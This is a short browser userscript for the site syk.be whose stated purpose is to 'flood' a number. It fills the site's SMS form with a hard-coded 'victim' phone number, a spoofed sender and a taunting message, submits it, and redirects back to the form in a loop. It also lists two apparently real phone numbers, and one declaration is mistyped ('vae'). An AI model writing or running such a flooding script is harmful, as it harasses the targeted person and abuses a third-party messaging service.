// ==UserScript==
// @name            syk.be
// @namespace      umer
// @description    floods number
// @include        http://www.syk.be/*
// ==/UserScript==

var victim="03229730978";
var sender="03212407558";
var smstext="You Daddy :P";
vae name="Hacker";

if(document.location=="http://www.syk.be/sms/")
{
document.forms[0].elements[1].value=name;

document.forms[0].elements[2].value=sender;

document.forms[0].elements[3].value=victim;

document.forms[0].elements[4].value=smstext;

document.forms[0].elements[5].click();

}
if(document.location=="http://www.syk.be/sent.php")
{
document.location="http://www.syk.be/sms/";
}